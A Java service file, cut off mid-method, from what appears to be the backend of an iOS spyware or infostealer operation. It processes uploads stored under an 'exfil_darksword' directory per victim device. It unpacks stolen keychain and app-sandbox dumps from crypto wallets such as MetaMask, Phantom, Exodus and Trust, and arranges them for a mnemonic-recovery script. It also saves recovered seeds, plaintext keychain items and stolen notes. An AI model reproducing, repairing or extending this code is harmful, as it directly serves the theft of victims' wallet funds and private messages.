package com.consumer.service;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.consumer.config.ConsumerProperties;
import com.consumer.dao.DeviceDao;
import com.consumer.dao.Ios18ParamDao;
import com.consumer.dao.MemorandumDao;
import com.consumer.entity.DeviceEntity;
import com.consumer.entity.Ios18ParamEntity;
import com.consumer.entity.MemorandumEntity;
import com.consumer.util.NoteStoreBodyExtractor;
import com.consumer.util.RedisPush;

import lombok.extern.slf4j.Slf4j;

import org.springframework.stereotype.Service;

import javax.annotation.Resource;
import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.time.Instant;
import java.time.LocalDateTime;
import java.time.ZoneOffset;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.ThreadLocalRandom;

import redis.clients.jedis.Jedis;
import redis.clients.jedis.JedisPool;
import redis.clients.jedis.params.SetParams;

/**
 * Consumer 消息分派与业务执行（文档 §7）。
 * <p>
 * 只处理 API 进程未完成的后续业务：
 * <ul>
 *   <li>war_unpack：解包 .bin → 同目录 {@code <basename>_unpacked}/
 *       （files/hex + files/sandbox + 说明文件）→ UPDATE unpack_path → 链式 parse_ci</li>
 *   <li>nb_memorandum：写 memorandum + touch device；有 NoteStore 时链式触发 nb_notestore 追加正文</li>
 * </ul>
 * parse_ci 已拆分到 {@link ParseCiHandler}，news4:tasks 已拆分到 {@link News4Handler}。
 * ios18param 的 INSERT 已在 API 进程同步完成，Consumer 不再重复写入。
 */
@Service
@Slf4j
public class CaptureDispatchService {

    /** hex 编码字符表，替代 String.format("%02x") 的热路径优化 */
    private static final char[] HEX_CHARS = "0123456789abcdef".toCharArray();

    private static final String WAR_CATEGORY_DIR = "06_钥匙串与钱包";
    /** 我方目录名：yyyyMMdd_HHmmss_SSS_<ios18paramId> */
    private static final DateTimeFormatter WAR_ENTRY_TS =
            DateTimeFormatter.ofPattern("yyyyMMdd_HHmmss_SSS");

    /** 文档 / Python：只落盘钱包/Notes/IM，其余 outside_allowlist 跳过 */
    private static final Set<String> HEX_APP_ALLOWLIST = new LinkedHashSet<>(Arrays.asList(
            "bitpie", "exodus", "phantom", "uniswap", "trust", "tonhub", "coin98", "mytonwallet",
            "imtoken", "metamask", "bitget", "tonkeeper", "solflare", "tronlink", "okx", "tokenpocket",
            "notes", "whatsapp", "telegram", "wallet"
    ));

    @Resource
    private Ios18ParamDao ios18ParamDao;
    @Resource
    private DeviceDao deviceDao;
    @Resource
    private MemorandumDao memorandumDao;
    @Resource
    private RedisPush redisPush;
    @Resource
    private JedisPool jedisPool;
    @Resource
    private ConsumerProperties consumerProps;

    // ==================================================================
    // 主队列入口（api18:tasks）
    // ==================================================================

    /**
     * 处理一条 api18:tasks 消息。成功返回 true（XACK），失败返回 false（重试）。
     */
    public boolean handleMain(Map<String, String> fields) {
        String job = fields == null ? null : fields.get("job");
        try {
            if (job == null) {
                return true;
            }
            switch (job) {
                case "war_unpack":
                    return handleWarUnpack(fields);
                case "nb_memorandum":
                    return handleNbMemorandum(fields);
                default:
                    return true;
            }
        } catch (Throwable t) {
            log.error("handleMain FAIL job={} err={} fields={}", job, t.toString(), fields, t);
            return false;
        }
    }

    /**
     * job=war_unpack：解析 war JSON → 落在 bin 旁 {@code <basename>_unpacked}/
     * （files/hex + files/sandbox + 轻量 meta.json），UPDATE unpack_path。
     */
    public boolean handleWarUnpack(Map<String, String> fields) {
    	log.info("【war_unpack】钥匙串解包开始");
        String idStr = fields.get("ios18param_id");
        String filePath = nullToEmpty(fields.get("file_path"));
        
        if (idStr == null || idStr.isEmpty()) {
            log.warn("【war_unpack】缺少 ios18param_id，跳过");
            return true;
        }
        
        int id;
        try {
            id = Integer.parseInt(idStr);
        } catch (NumberFormatException e) {
            log.warn("【war_unpack】ios18param_id 非法 idStr={}", idStr);
            return true;
        }
        
        Ios18ParamEntity entity = ios18ParamDao.findById(id);
        if (entity == null) {
            log.warn("【war_unpack】ios18param 记录不存在 id={}，跳过", id);
            return true;
        }

        // 幂等：已存在 unpack_path 说明已处理过（多实例/重试时重复消费），直接跳过
        if (entity.getUnpackPath() != null && !entity.getUnpackPath().isEmpty()) {
            // 链式触发 parse_ci 也需要重新发一次，避免 ACK 丢失场景下 parse_ci 被永久阻塞
            try {
                Map<String, String> parseJob = new HashMap<>();
                parseJob.put("job", "parse_ci");
                parseJob.put("ios18param_id", String.valueOf(id));
                parseJob.put("file_path", filePath);
                parseJob.put("unpack_path", entity.getUnpackPath());
                parseJob.put("kind", entity.getKind() == null ? "" : entity.getKind());
                parseJob.put("device_id", entity.getDeviceId() == null ? "" : entity.getDeviceId());
                redisPush.notifySync(parseJob, redisPush.streamParseCi());
            } catch (Throwable t) {
                log.error("【war_unpack】幂等重入时 parse_ci 入队失败 id={} err={}", id, t.toString());
            }
            return true;
        }

        // 分布式锁：防止多实例同时解包同一个 .bin（幂等检查 unpack_path 与实际写 unpack_path 之间的竞态）
        String lockKey = "war_unpack:lock:" + id;
        String lockToken = UUID.randomUUID().toString();
        boolean locked = false;
        try {
            try (Jedis j = jedisPool.getResource()) {
                String res = j.set(lockKey, lockToken, SetParams.setParams().nx().ex(300));
                locked = "OK".equals(res);
            } catch (Throwable t) {
                log.warn("【war_unpack】分布式锁获取异常，降级继续 id={} err={}", id, t.toString());
                locked = true; // Redis 不可用时降级，不阻塞业务
            }
            if (!locked) {
                log.info("【war_unpack】分布式锁未获取，其他实例正在处理 id={}", id);
                return false;
            }

        if (filePath.isEmpty()) {
            filePath = nullToEmpty(entity.getFilePath());
        }
        // 直接使用完整路径
        File bin = new File(filePath);
        if (!bin.exists() || bin.length() == 0) {
            log.warn("【war_unpack】bin 不存在或为空 id={} path={}", id, filePath);
            return true;
        }

        // 设备 UUID（文档：去横线、大写）
        String deviceUuid = normalizeDeviceUuid(entity.getDeviceId());
        if (deviceUuid.isEmpty()) {
            deviceUuid = normalizeDeviceUuid(extractDeviceFromPath(filePath));
        }
        if (deviceUuid.isEmpty()) {
            deviceUuid = "UNKNOWN_DEVICE";
            log.warn("【war_unpack】无法解析 device UUID，使用占位 id={} path={}", id, filePath);
        }

        // 原落盘：与 .bin 同目录，<basename>_unpacked（无 exfil / 06_ 分类层）
        File unpackDir = WarDocLayoutWriter.resolveEntryDirBesideBin(bin);
        File hexDir = new File(unpackDir, "files/hex");
        File sandboxDir = new File(unpackDir, "files/sandbox");
        
        try {
            Files.createDirectories(hexDir.toPath());
            Files.createDirectories(sandboxDir.toPath());
        } catch (IOException e) {
            log.warn("【war_unpack】创建解压目录失败 id={} dir={} err={}", id, unpackDir, e.toString());
            return false;
        }
        
        // 读取原始文件内容（已在 API 端解密，磁盘存明文）
        String rawJson;
        try {
            rawJson = new String(readFileBytes(bin), StandardCharsets.UTF_8);
        } catch (IOException e) {
            log.warn("【war_unpack】读 bin 失败 id={} err={}", id, e.toString());
            return false;
        }

        // 兼容：war 数据可能嵌套在 {"data": {...}} / {"payload": {...}} 里，尝试穿透
        JSONObject war;
        try {
            Object parsedTop = JSON.parse(rawJson);
            if (!(parsedTop instanceof JSONObject)) {
                ios18ParamDao.updateUnpack(id, "", "JSON解析结果为空");
                return true;
            }
            war = (JSONObject) parsedTop;
            if (!war.containsKey("keychain") && !war.containsKey("sandbox")) {
                for (String wrapKey : new String[]{"data", "payload", "war", "content"}) {
                    Object inner = war.get(wrapKey);
                    if (inner instanceof JSONObject) {
                        JSONObject ij = (JSONObject) inner;
                        if (ij.containsKey("keychain") || ij.containsKey("sandbox")
                                || ij.containsKey("seeds") || ij.containsKey("secitem_readable")) {
                            war = ij;
                            break;
                        }
                    }
                }
            }
        } catch (Exception e) {
            log.warn("【war_unpack】JSON 解析失败 id={} err={}", id, e.toString());
            return false;
        }

        // 提取钥匙串和沙盒：写 files/；就地 stub 大 blob（不再另 parse 一份、不写大 payload.json）
        int extractedFiles = 0;
        String extractRemark = "";
        Map<String, Integer> walletHits = new LinkedHashMap<>();
        JSONObject payloadObj = war;
        try {
            boolean hasKeychain = war.getJSONObject("keychain") != null;
            boolean hasSandbox = war.getJSONObject("sandbox") != null;
            if (!hasKeychain && !hasSandbox) {
                extractRemark = "顶层JSON无keychain/sandbox字段(keys=" + war.keySet() + ")";
                log.warn("【war_unpack】提取 0 文件：顶层 key 列表异常 id={} keys={}", id, war.keySet());
            } else {
                extractedFiles = WarDocLayoutWriter.extractAndWrite(payloadObj, unpackDir, walletHits);
                if (extractedFiles == 0) {
                    extractRemark = "存在 keychain/sandbox 但实际提取 0 个条目(keychain=" + hasKeychain + ",sandbox=" + hasSandbox + ")";
                    log.warn("【war_unpack】提取 0 文件：keychain/sandbox 结构未解析出条目 id={}", id);
                }
            }
        } catch (Exception e) {
            extractRemark = "提取异常:" + e.getMessage();
            log.warn("【war_unpack】提取异常 id={} err={}", id, e.toString());
        }

        // 轻量 meta（不写 这是什么/summary/SecItem/payload）
        try {
            WarDocLayoutWriter.writeSidecars(unpackDir, entity, bin, payloadObj, extractedFiles, deviceUuid, walletHits);
        } catch (IOException e) {
            log.warn("【war_unpack】写 sidecar 失败 id={} err={}", id, e.toString());
        }
        
        // 更新数据库 - 记录解压路径（存完整路径，与 file_path 格式一致）
        String absUnpackPath = unpackDir.getAbsolutePath().replace('\\', '/');
        String remark = extractedFiles > 0 ? "解包成功:提取" + extractedFiles + "个文件"
                : ("解包无提取数据:" + (extractRemark.isEmpty() ? "unknown" : extractRemark));
        ios18ParamDao.updateUnpack(id, absUnpackPath, remark);
        log.info("【war_unpack】钥匙串解包更新成功：id={} 解压路径={} 提取文件数={}", id, absUnpackPath, extractedFiles);

        // 仅在解包 + DB UPDATE 均成功后推送，确保 parse_ci 能读到 unpack_path
        try {
            // 兜底：entity.device_id 为空时从 file_path 文件名提取 device UUID
            String devForParse = entity.getDeviceId() == null ? "" : entity.getDeviceId();
            if (devForParse.isEmpty() && !filePath.isEmpty()) {
                devForParse = extractDeviceFromPath(filePath);
                if (!devForParse.isEmpty()) {
                    log.info("【war_unpack】device_id 从 file_path 兜底提取 id={} device={} file={}",
                            id, devForParse, filePath);
                }
            }
            Map<String, String> parseJob = new HashMap<>();
            parseJob.put("job", "parse_ci");
            parseJob.put("ios18param_id", String.valueOf(id));
            parseJob.put("file_path", filePath);
            parseJob.put("unpack_path", absUnpackPath);
            parseJob.put("kind", entity.getKind() == null ? "" : entity.getKind());
            parseJob.put("device_id", devForParse);
            redisPush.notifySync(parseJob, redisPush.streamParseCi());
            log.info("【war_unpack】链式触发 parse_ci 入队成功 id={} device={}", id, devForParse);
        } catch (Throwable t) {
            log.error("【war_unpack】链式触发 parse_ci 入队失败 id={} err={}", id, t.toString(), t);
            // 入队失败不影响 war_unpack 的 XACK；parse_ci 队列有重试+DLQ兜底，必要时可扫 unpack_path 重放
        }

        return true;
        } finally {
            if (locked) {
                try (Jedis j = jedisPool.getResource()) {
                    // Lua 脚本安全释放锁（只删自己的 token，避免误删其他实例的锁）
                    j.eval("if redis.call('get', KEYS[1]) == ARGV[1] then return redis.call('del', KEYS[1]) else return 0 end",
                            1, lockKey, lockToken);
                } catch (Throwable ignore) {}
            }
        }
    }

    /**
     * 提取 keychain tables 到 files/hex/{app}/，按 app 分子目录，匹配 recover_hq8_mnemonics.py 的目录结构。
     * - bitpie: hex/bitpie/{account}_data.txt（hex 文本，Python 用 bytes.fromhex 解码）
     * - uniswap: hex/uniswap/{account}.txt（解码后的 UTF-8 文本，文件名含 mnemonic）
     * - phantom: hex/phantom/{account}.json（解码后的 JSON 文本）
     * - exodus: hex/exodus/{account}.json（解码后的 JSON 文本）
     * - trustwallet: hex/trustwallet/{account}_data.txt（hex 文本）
     * - 其他: hex/{app}/{account}.data.bin（解码后的二进制）
     */
    private int extractKeychain(JSONObject war, File hexDir) {
        int count = 0;
        JSONObject keychain = war.getJSONObject("keychain");
        if (keychain == null) return 0;

        JSONObject tables = keychain.getJSONObject("tables");
        if (tables == null) return 0;

        for (String tableName : tables.keySet()) {
            JSONObject table = tables.getJSONObject(tableName);
            if (table == null) continue;
            JSONArray items = table.getJSONArray("items");
            if (items == null) continue;

            for (int i = 0; i < items.size(); i++) {
                JSONObject item = items.getJSONObject(i);
                if (item == null) continue;

                String service = firstNonEmpty(item.getString("service"), "unknown");
                String account = firstNonEmpty(item.getString("account"), "");
                String app = mapKeychainApp(service, account);

                // 创建 per-app 子目录
                File appDir = new File(hexDir, app);
                try {
                    Files.createDirectories(appDir.toPath());
                } catch (IOException e) {
                    continue;
                }

                // 获取原始 dataHex 字符串
                Object dataHexObj = item.get("dataHex");
                String rawHexStr = null;
                byte[] decodedBytes = null;
                if (dataHexObj instanceof String) {
                    rawHexStr = (String) dataHexObj;
                    decodedBytes = extractDataBytes(dataHexObj);
                } else if (dataHexObj instanceof JSONObject) {
                    // 嵌套对象：尝试提取 dataHex 或 data 字段
                    JSONObject obj = (JSONObject) dataHexObj;
                    Object inner = obj.get("dataHex");
                    if (inner instanceof String) {
                        rawHexStr = (String) inner;
                        decodedBytes = extractDataBytes(inner);
                    } else {
                        Object data = obj.get("data");
                        if (data instanceof String) {
                            rawHexStr = (String) data;
                            decodedBytes = extractDataBytes(data);
                        }
                    }
                }
                if (decodedBytes == null || decodedBytes.length == 0) continue;

                // 根据 app 类型决定文件名和内容格式
                String fileName;
                byte[] fileContent;
                switch (app) {
                    case "bitpie":
                        // Python 期望 hex 文本文件，用 bytes.fromhex 解码
                        fileName = sanitizeFileName(account) + "_data.txt";
                        fileContent = (rawHexStr != null ? rawHexStr : bytesToHex(decodedBytes))
                                .getBytes(StandardCharsets.UTF_8);
                        break;
                    case "trustwallet":
                    case "trust":
                        // ⚠ 与 bitpie 的 _data.txt 内容格式完全不同：
                        // bitpie：decodedBytes = 二进制熵，Python 用 bytes.fromhex() 解码 → 必须 bytesToHex 存
                        // trust：decodedBytes = UTF-8 文本（密码是 64hex 字符串、keystore 是 JSON、PIN 是数字串），
                        //        Python 直接 txt.strip().encode() / json.loads(txt) → 直接存 decodedBytes（明文）
                        String trustStr = new String(decodedBytes, StandardCharsets.UTF_8);
                        if (trustStr.trim().startsWith("{")) {
                            fileName = sanitizeFileName(account) + ".json";
                            fileContent = decodedBytes;
                        } else {
                            // 密码 / PIN / 配置 = UTF-8 文本，直接存 decodedBytes（不做额外 hex 编码，对齐 Python 直接读 txt）
                            // 文件名惯例：trustwalletUTC--*（64hex 密码）存成 .txt 以便 MnemonicExtractor 按 startsWith/endsWith 匹配
                            fileName = sanitizeFileName(account) + ".txt";
                            fileContent = decodedBytes;
                        }
                        break;
                    case "uniswap":
                        // Python 期望明文 mnemonic，文件名需含 "mnemonic"
                        fileName = sanitizeFileName(account) + ".txt";
                        if (!fileName.toLowerCase().contains("mnemonic")) {
                            fileName = "mnemonic_" + fileName;
                        }
                        fileContent = decodedBytes; // 已从 hex 解码为 UTF-8 文本
                        break;
                    case "phantom":
                    case "exodus":
                        // Python 期望 JSON 文件
                        fileName = sanitizeFileName(account) + ".json";
                        fileContent = decodedBytes;
                        break;
                    default:
                        fileName = sanitizeFileName(account) + ".data.bin";
                        fileContent = decodedBytes;
                        break;
                }

                // 处理重名文件（同 app 同 account 多条记录）
                File outFile = new File(appDir, fileName);
                if (outFile.exists()) {
                    String base = fileName.contains(".") ? fileName.substring(0, fileName.lastIndexOf('.'))
                            : fileName;
                    String ext = fileName.contains(".") ? fileName.substring(fileName.lastIndexOf('.')) : "";
                    outFile = new File(appDir, base + "_" + (System.currentTimeMillis() % 10000) + ext);
                }

                try {
                    Files.write(outFile.toPath(), fileContent);
                    count++;
                } catch (IOException e) {
                }
            }
        }
        return count;
    }

    /** 将 keychain service/account 映射到 app 子目录名（匹配 recover_hq8_mnemonics.py） */
    private String mapKeychainApp(String service, String account) {
        String svc = service == null ? "" : service;
        String acc = account == null ? "" : account;
        String combined = (svc + " " + acc).toLowerCase();
        // keychain 中 account 常为 hex 编码的字符串（如 phantom vault seed），尝试解码后再匹配
        String decoded = tryHexDecodeUtf8(acc);
        String combinedEx = combined + " " + (decoded == null ? "" : decoded.toLowerCase());

        if (combinedEx.contains("bitpie")) return "bitpie";
        if (combinedEx.contains("uniswap")) return "uniswap";
        if (combinedEx.contains("phantom")) return "phantom";
        if (combinedEx.contains("exodus")) return "exodus";
        // 先精确匹配 trustwallet / trust.wallet → trustwallet 子目录
        if (combinedEx.contains("trustwallet") || combinedEx.contains("trust.wallet")) return "trustwallet";
        // 再匹配 trust.xxx（如 trust.account / trust_wallet_service 等）→ trust 子目录
        // 对齐 Python (2) 脚本：hex_dirs = [hex/trustwallet, hex/trust]
        if (combinedEx.contains("trust") && !combinedEx.contains("trustpilot")) return "trust";
        if (combinedEx.contains("tonhub")) return "tonhub";
        if (combinedEx.contains("coin98")) return "coin98";
        if (combinedEx.contains("mytonwallet")) return "mytonwallet";
        if (combinedEx.contains("im.token") || combinedEx.contains("imtoken")) return "imtoken";
        // 默认：用 sanitized service 名
        return sanitizeFileName(svc.isEmpty() ? "unknown" : svc);
    }

    /** 尝试将 hex 字符串解码为 UTF-8 文本（用于 keychain account 识别钱包归属） */
    private String tryHexDecodeUtf8(String s) {
        if (s == null || s.isEmpty()) return null;
        String trimmed = s.trim();
        if (trimmed.length() % 2 != 0 || !trimmed.matches("[0-9a-fA-F]+")) return null;
        try {
            byte[] bytes = hexToBytes(trimmed);
            String decoded = new String(bytes, StandardCharsets.UTF_8);
            int printable = 0;
            for (char c : decoded.toCharArray()) if (c >= 0x20 && c < 0x7f) printable++;
            return printable * 2 >= decoded.length() ? decoded : null;
        } catch (Exception e) { return null; }
    }

    /** bytes 转 hex 字符串 */
    private static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder(bytes.length * 2);
        for (byte b : bytes) {
            int v = b & 0xFF;
            sb.append(HEX_CHARS[v >>> 4]).append(HEX_CHARS[v & 0x0F]);
        }
        return sb.toString();
    }

    /** 从 dataHex 字段提取字节数据：支持 hex 字符串 / base64 / 对象内 dataHex */
    private byte[] extractDataBytes(Object dataHex) {
        if (dataHex == null) return null;
        if (dataHex instanceof String) {
            String hex = (String) dataHex;
            // 尝试 hex 解码
            if (hex.matches("[0-9a-fA-F]+") && hex.length() % 2 == 0) {
                try { return hexToBytes(hex); } catch (Exception ignore) {}
            }
            // 尝试 base64 解码
            try { return Base64.getDecoder().decode(hex); } catch (Exception ignore) {}
            // 普通字符串
            return hex.getBytes(StandardCharsets.UTF_8);
        }
        if (dataHex instanceof JSONObject) {
            JSONObject obj = (JSONObject) dataHex;
            // 原始数据在 dataHex 字段内（嵌套）
            Object inner = obj.get("dataHex");
            if (inner != null) return extractDataBytes(inner);
            // 或 data 字段
            Object data = obj.get("data");
            if (data instanceof String) {
                try { return Base64.getDecoder().decode((String) data); } catch (Exception ignore) {}
            }
            // 或 decoded_bytes 预览
            Object preview = obj.get("preview_utf8");
            if (preview instanceof String) {
                return ((String) preview).getBytes(StandardCharsets.UTF_8);
            }
        }
        return null;
    }

    /**
     * 提取 sandbox 数据到 files/sandbox/{app}/{relative_path}，匹配 recover_hq8_mnemonics.py 的目录结构。
     * sandbox JSON 结构: { "app_name": { "relative/file/path": "base64_content", ... } }
     * Python 脚本期望每个 app 目录下按真实文件路径展开，如:
     *   sandbox/trust/Documents/keystore/UTC--*.json
     *   sandbox/tonhub/Documents/mmkv/mmkv.default
     *   sandbox/coin98/{32hex_file}
     */
    private int extractSandbox(JSONObject war, File sandboxDir) {
        int count = 0;
        JSONObject sandbox = war.getJSONObject("sandbox");
        if (sandbox == null) return 0;

        for (String appName : sandbox.keySet()) {
            JSONObject appData = sandbox.getJSONObject(appName);
            if (appData == null) continue;

            File appDir = new File(sandboxDir, sanitizeFileName(appName));
            try {
                Files.createDirectories(appDir.toPath());
            } catch (IOException e) {
                continue;
            }

            for (String relPath : appData.keySet()) {
                Object val = appData.get(relPath);
                if (!(val instanceof String)) continue;

                String content = (String) val;
                byte[] fileBytes;

                // 尝试 base64 解码（sandbox 值通常是 base64 编码的文件内容）
                try {
                    fileBytes = Base64.getDecoder().decode(content);
                } catch (Exception notB64) {
                    // 不是 base64，按原始文本写入
                    fileBytes = content.getBytes(StandardCharsets.UTF_8);
                }

                // relPath 作为相对文件路径展开（如 Documents/keystore/UTC--xxx.json）
                String safePath = sanitizeRelativePath(relPath);
                if (safePath == null || safePath.isEmpty()) continue;

                File outFile = new File(appDir, safePath);
                try {
                    File parent = outFile.getParentFile();
                    if (parent != null && !parent.exists()) {
                        Files.createDirectories(parent.toPath());
                    }
                    Files.write(outFile.toPath(), fileBytes);
                    count++;
                } catch (IOException e) {
                }
            }
        }
        return count;
    }

    /** 将相对路径清理为安全路径（防止路径穿越，保留子目录结构） */
    private static String sanitizeRelativePath(String path) {
        if (path == null || path.isEmpty()) return null;
        // 标准化分隔符
        path = path.replace('\\', '/');
        // 去除前导 /
        while (path.startsWith("/")) path = path.substring(1);
        // 分割并过滤 .. 防止路径穿越
        String[] parts = path.split("/");
        StringBuilder sb = new StringBuilder();
        for (String part : parts) {
            if (part == null || part.isEmpty() || part.equals(".") || part.equals("..")) continue;
            if (sb.length() > 0) sb.append("/");
            sb.append(part.replaceAll("[^a-zA-Z0-9_\\-\\.]", "_"));
        }
        return sb.length() > 0 ? sb.toString() : null;
    }

    /** 写 MANIFEST.txt（兼容旧脚本）+ 文档 sidecar 已在 writeWarDocSidecars */
    private void writeManifest(File unpackDir, Ios18ParamEntity entity, File bin, int extractedFiles) throws IOException {
        Path manifest = Paths.get(unpackDir.getAbsolutePath(), "MANIFEST.txt");
        List<String> lines = new ArrayList<>();
        lines.add("ios18param_id=" + entity.getId());
        lines.add("kind=" + firstNonEmpty(entity.getKind(), ""));
        lines.add("device_id=" + firstNonEmpty(entity.getDeviceId(), ""));
        lines.add("size=" + bin.length());
        lines.add("original_file=" + bin.getAbsolutePath());
        lines.add("extracted_files=" + extractedFiles);
        lines.add("unpack_time=" + System.currentTimeMillis() / 1000.0);
        Files.write(manifest, lines, StandardCharsets.UTF_8);
    }

    /**
     * 文档落盘根：{uploadDir}/exfil_darksword/&lt;UUID&gt;/06_钥匙串与钱包/&lt;yyyyMMdd_HHmmss_SSS&gt;_&lt;ios18paramId&gt;/
     * 与 ctwo memres 的 exfil_darksword 同根。
     */
    private File resolveWarEntryDir(String deviceUuid, int ios18paramId) {
        String upload = firstNonEmpty(consumerProps.getUploadDir(), "data/uploads");
        LocalDateTime now = LocalDateTime.ofInstant(Instant.now(), ZoneOffset.ofHours(8));
        String entryName = WAR_ENTRY_TS.format(now) + "_" + ios18paramId;
        Path dir = Paths.get(upload, "exfil_darksword", deviceUuid, WAR_CATEGORY_DIR, entryName);
        return dir.toFile();
    }

    /** 设备 UUID：去横线、大写 */
    private static String normalizeDeviceUuid(String raw) {
        if (raw == null) return "";
        String s = raw.trim().replace("-", "").toUpperCase(Locale.ROOT);
        if (s.isEmpty()) return "";
        // 只保留 hex，避免路径污染
        if (!s.matches("[0-9A-F]+")) {
            s = s.replaceAll("[^0-9A-Fa-f]", "").toUpperCase(Locale.ROOT);
        }
        return s;
    }

    /** 设备目录下写 00_目录说明.txt（不存在才写） */
    private void ensureDeviceIndex(String deviceUuid) throws IOException {
        String upload = firstNonEmpty(consumerProps.getUploadDir(), "data/uploads");
        Path deviceDir = Paths.get(upload, "exfil_darksword", deviceUuid);
        Files.createDirectories(deviceDir);
        Path index = deviceDir.resolve("00_目录说明.txt");
        if (Files.exists(index)) return;
        String text = ""
                + "本目录按设备 UUID 分类落盘（对齐 DarkSword / YY 文档）。\n"
                + "\n"
                + "05_备忘录笔记/     — POST /nb\n"
                + "06_钥匙串与钱包/   — POST /war（files/hex + files/sandbox）\n"
                + "10_内存扫描/       — POST /api/memres\n"
                + "keychain/ keybag/ wallet/ 等 — FD /stats 原始大块（若有）\n";
        Files.write(index, text.getBytes(StandardCharsets.UTF_8));
    }

    /**
     * 写文档要求的说明/摘要/payload/meta，以及可选 secitem / seeds。
     */
    private void writeWarDocSidecars(File unpackDir, Ios18ParamEntity entity, File bin,
                                    JSONObject war, String rawJson, int extractedFiles,
                                    String deviceUuid) throws IOException {
        Path root = unpackDir.toPath();
        Files.createDirectories(root);

        String what = ""
                + "分类：06_钥匙串与钱包\n"
                + "接口：POST /war（大包可走 war 分片后再解码）\n"
                + "内容：钥匙串 dataHex 分桶到 files/hex/<app>/，钱包沙盒到 files/sandbox/<app>/\n"
                + "后续：parse_ci / recover_hq8 类脚本扫 hex+sandbox 还原助记词\n"
                + "ios18param_id=" + entity.getId() + "\n"
                + "device=" + deviceUuid + "\n"
                + "source_bin=" + bin.getAbsolutePath() + "\n";
        Files.write(root.resolve("这是什么.txt"), what.getBytes(StandardCharsets.UTF_8));

        // summary
        Set<String> hexApps = listChildNames(new File(unpackDir, "files/hex"));
        Set<String> sandboxApps = listChildNames(new File(unpackDir, "files/sandbox"));
        boolean hasSeeds = war != null && (war.get("seeds") != null
                || war.getJSONObject("seeds") != null
                || war.get("wallet_seed_plaintext") != null);
        boolean hasSecReadable = war != null && war.get("secitem_readable") != null;
        boolean hasSecFull = war != null && war.get("secitem_full") != null;
        StringBuilder summary = new StringBuilder();
        summary.append("device=").append(deviceUuid).append('\n');
        summary.append("ios18param_id=").append(entity.getId()).append('\n');
        summary.append("extracted_files=").append(extractedFiles).append('\n');
        summary.append("hex_apps=").append(hexApps).append('\n');
        summary.append("sandbox_apps=").append(sandboxApps).append('\n');
        summary.append("has_seeds=").append(hasSeeds).append('\n');
        summary.append("has_secitem_readable=").append(hasSecReadable).append('\n');
        summary.append("has_secitem_full=").append(hasSecFull).append('\n');
        summary.append("bin_size=").append(bin.length()).append('\n');
        Files.write(root.resolve("summary.txt"), summary.toString().getBytes(StandardCharsets.UTF_8));

        // payload.json：明文 war JSON（大字段仍在；files/ 已拆出可独立扫）
        Files.write(root.resolve("payload.json"),
                (rawJson == null ? "{}" : rawJson).getBytes(StandardCharsets.UTF_8));

        // meta.json
        JSONObject meta = new JSONObject(true);
        meta.put("ios18param_id", entity.getId());
        meta.put("kind", entity.getKind());
        meta.put("device_id", deviceUuid);
        meta.put("source_bin", bin.getAbsolutePath().replace('\\', '/'));
        meta.put("extracted_files", extractedFiles);
        meta.put("hex_apps", hexApps);
        meta.put("sandbox_apps", sandboxApps);
        meta.put("unpack_time", System.currentTimeMillis() / 1000.0);
        meta.put("category", WAR_CATEGORY_DIR);
        Files.write(root.resolve("meta.json"),
                meta.toJSONString().getBytes(StandardCharsets.UTF_8));

        // secitem
        if (war != null) {
            writeOptionalText(root.resolve("钥匙串SecItem明文.txt"), war.get("secitem_readable"));
            writeOptionalText(root.resolve("钥匙串SecItem完整dump.txt"), war.get("secitem_full"));
            Object seeds = war.get("seeds");
            if (seeds == null) {
                // 部分包把种子放在顶层 wallet_seed_plaintext / imtoken_extract
                JSONObject seedWrap = new JSONObject(true);
                if (war.get("wallet_seed_plaintext") != null) {
                    seedWrap.put("wallet_seed_plaintext", war.get("wallet_seed_plaintext"));
                }
                if (war.get("imtoken_extract") != null) {
                    seedWrap.put("imtoken_extract", war.get("imtoken_extract"));
                }
                if (war.get("wallet_mem_resident") != null) {
                    seedWrap.put("wallet_mem_resident", war.get("wallet_mem_resident"));
                }
                if (!seedWrap.isEmpty()) seeds = seedWrap;
            }
            if (seeds != null) {
                String seedsJson = seeds instanceof String
                        ? (String) seeds
                        : JSON.toJSONString(seeds, true);
                Files.write(root.resolve("seeds_recovered.json"),
                        seedsJson.getBytes(StandardCharsets.UTF_8));
            }
        }

        writeManifest(unpackDir, entity, bin, extractedFiles);
    }

    private static void writeOptionalText(Path path, Object value) throws IOException {
        if (value == null) return;
        String text;
        if (value instanceof String) {
            text = (String) value;
        } else {
            text = JSON.toJSONString(value, true);
        }
        if (text == null || text.isEmpty()) return;
        Files.write(path, text.getBytes(StandardCharsets.UTF_8));
    }

    private static Set<String> listChildNames(File dir) {
        Set<String> names = new TreeSet<>();
        if (dir == null || !dir.isDirectory()) return names;
        File[] kids = dir.listFiles();
        if (kids == null) return names;
        for (File f : kids) {
            if (f.isDirectory()) names.add(f.getName());
        }
        return names;
    }

    // 注：computeRelativePath 已弃用 — unpack_path 现在直接存完整绝对路径
    //     （与 file_path 格式一致），避免 parse_ci 侧再拼绝对路径。

    // ==================================================================
    // nb_memorandum：读 body → 写 memorandum + touch device
    // ==================================================================

    /**
     * job=nb_memorandum：读取 body → 按 lhu 找 device → INSERT memorandum → touch device。
     * 不加 @Transactional：单条 upsert 自动提交，避免长事务锁表。
     */
    public boolean handleNbMemorandum(Map<String, String> fields) throws Exception {
        String ios18IdStr = fields.get("ios18param_id");
        String deviceId = nullToEmpty(fields.get("device_id"));
        String storage = nullToEmpty(fields.get("storage"));
        String filePath = nullToEmpty(fields.get("file_path"));
        String bodyB64 = nullToEmpty(fields.get("body_b64"));
        String lhu = deviceId.isEmpty() ? nullToEmpty(fields.get("lhu")) : deviceId;
        Integer ios18Id = null;
        if (ios18IdStr != null && !ios18IdStr.isEmpty()) {
            try { ios18Id = Integer.parseInt(ios18IdStr); } catch (Exception ignore) {}
        }
        String rawBody;
        if ("file".equals(storage) && !filePath.isEmpty()) {
            Path path = Paths.get(filePath);
            if (!Files.isRegularFile(path)) {
                log.warn("【nb_memorandum】文件不存在 id={} path={}", ios18Id, filePath);
                return true;
            }
            byte[] bytes = Files.readAllBytes(path);
            rawBody = new String(bytes, StandardCharsets.UTF_8);
        } else if (!bodyB64.isEmpty()) {
            rawBody = new String(Base64.getDecoder().decode(bodyB64), StandardCharsets.UTF_8);
        } else {
